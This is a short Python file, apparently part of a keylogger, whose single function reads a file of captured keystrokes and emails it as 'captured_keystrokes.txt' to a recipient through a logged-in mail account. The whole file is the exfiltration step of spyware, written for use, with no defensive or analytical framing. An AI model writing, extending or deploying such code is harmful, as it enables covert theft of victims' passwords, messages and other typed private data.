from send_email import send_email

def send_keystrokes_email(server, sender_email, recipient_email, subject, message, file_path):
    # Attach the captured keystrokes file
    with open(file_path, 'r') as file:
        attachment_data = file.read()

    # Send the email with the attachment using the logged-in email account
    send_email(server, sender_email, recipient_email, subject, message, attachment_data, 'captured_keystrokes.txt')
